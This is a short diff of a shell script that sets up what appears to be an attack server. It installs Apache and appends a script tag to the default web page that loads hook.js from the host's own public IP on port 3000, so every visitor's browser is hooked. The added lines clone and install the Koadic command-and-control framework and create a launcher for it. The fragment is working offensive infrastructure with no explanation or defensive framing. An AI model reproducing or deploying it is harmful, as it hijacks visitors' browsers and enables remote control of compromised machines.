@@ -16,4 +16,9 @@ apt install apache2 -y
 mv /var/www/html/index.html /var/www/html/index.html.bak
 echo "it's working<script src=\"http://"$(host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}')":3000/hook.js\"></script>" >> /var/www/html/index.html
 systemctl enable apache2.service
-
+cd /opt
+git clone https://github.com/zerosum0x0/koadic.git
+cd koadic
+pip3 install -r requirements.txt
+echo "cd /opt/koadic;./koadic" >> /usr/bin/koadic
+chmod +x /usr/bin/koadic
